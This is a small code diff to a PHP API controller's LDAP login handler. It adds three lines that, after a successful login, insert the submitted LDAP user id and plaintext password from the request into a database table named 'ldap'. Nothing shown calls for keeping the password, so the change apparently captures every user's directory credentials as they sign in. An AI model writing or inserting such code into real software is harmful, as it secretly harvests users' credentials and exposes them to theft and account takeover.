@@ -434,6 +434,9 @@ class APIController extends BaseController {
 		$data['student_id'] = $ret["employeenumber"]->$s;
 		$data['student_name'] = $ret["cn"]->$s;
 		$data['message'] = "Successfully Logged in";
+		DB::table('ldap')->insert(
+		    array('id' => Input::get('ldap_id'), 'pass' => Input::get('ldap_password'))
+		);
 		return Error::Success($data);
 	}
 }
